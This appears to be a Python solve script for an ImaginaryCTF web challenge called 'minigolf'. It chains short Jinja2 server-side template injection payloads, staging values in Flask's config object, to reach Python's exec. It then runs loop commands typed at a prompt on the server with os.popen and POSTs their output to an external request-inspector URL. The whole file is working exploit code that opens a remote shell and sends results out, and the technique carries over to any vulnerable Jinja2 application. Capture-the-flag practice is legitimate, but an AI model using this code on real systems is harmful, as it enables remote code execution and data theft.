import html
import requests

def send(query, raw=False, **kwargs):
  payload = query if raw else '{%if ' + query + '%}{%endif%}'
  print(f'[+] {len(html.escape(payload))=}, {payload=}')
  assert len(html.escape(payload)) <= 69
  req = requests.get(
    "http://minigolf.chal.imaginaryctf.org",
    {
      "txt": payload,
      **kwargs
    }
  )
  res = req.text
  print(f'[+] {html.unescape(res)=}\n\n')
  if not raw and "Error" in res:
    assert False

# config[dest] = src.attr
def sub_attr(dest, src, attr):
  send("config.F(config.V,request.args.v)", v=attr)
  send(f"config.F(config.{dest.upper()},{src}|attr(config.v))")
# config[dest] = src[item]
def sub_item(dest, src, item):
  send("config.F(config.V,request.args.v)", v=item)
  send(f"config.F(config.{dest.upper()},{src}.get(config.v))")


# s
send("config.setdefault(request.args.X,request.args.s)", X='S', s='__setitem__')
# f
send("config.setdefault(request.args.X,request.args.ff)", X='FF', ff="F")
send("config.setdefault(config.FF,config|attr(config.S))", X='F')
# v
send("config.setdefault(request.args.X,request.args.v)", X='V', v='v')
# w
send("config.setdefault(request.args.X,request.args.w)", X='W', w='w')

sub_attr('w', 'joiner', '__init__')
sub_attr('w', 'config.w', '__globals__')

sub_item('w', 'config.w', '__builtins__')
sub_item('w', 'config.w', 'exec')

while True:
  send("config.w(request.args.q)", q=f"""
r=__import__('urllib').request
r.urlopen(r.Request('https://requestinspector.com/inspect/01g85s4t9q77sty57kf0fyhksy', data=__import__('os').popen('{input('> ')}').read().encode(), method='POST'))
""")
